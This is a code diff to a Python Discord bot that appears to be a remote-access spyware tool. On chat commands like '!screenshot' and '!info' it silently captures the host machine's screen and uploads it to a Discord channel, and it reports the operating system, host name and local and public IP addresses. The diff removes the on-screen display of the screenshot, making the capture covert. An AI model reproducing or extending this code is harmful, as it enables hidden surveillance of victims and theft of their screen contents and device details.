@@ -9,8 +9,6 @@ import platform
 client = discord.Client()
 
 
-# -- functions --
-
 
 # gets ip address
 def get_ip():
@@ -46,19 +44,18 @@ async def on_message(message):
     exit()
 
 
+  # takes the screenshot  
   elif message.content.startswith("!screenshot"):
     import PIL.ImageGrab
     screenshot = PIL.ImageGrab.grab()
-    screenshot.show()
     screenshot.save("Windows_screenshot.jpg")
-    screenshot.close()
     for file in os.listdir("SecurityBot"):
       if file.endswith(".jpg"):
         await message.channel.send(file=discord.File(file))
         time.sleep(2)
         os.remove(file)
 
-
+  # gets info about user's device
   elif message.content.startswith("!info"):
     time.sleep(5)
     h_name = socket.gethostname()
@@ -66,7 +63,7 @@ async def on_message(message):
     await message.channel.send("**Operating System:** " + platform.system())
     await message.channel.send("**Host Name is:** " + h_name)
     await message.channel.send("**Computer IP Address (localhost) is:** " + IP_addres)
-    await message.channel.send(get_ip())
+    await message.channel.send("**IP Address:** " + get_ip())
     
     
 
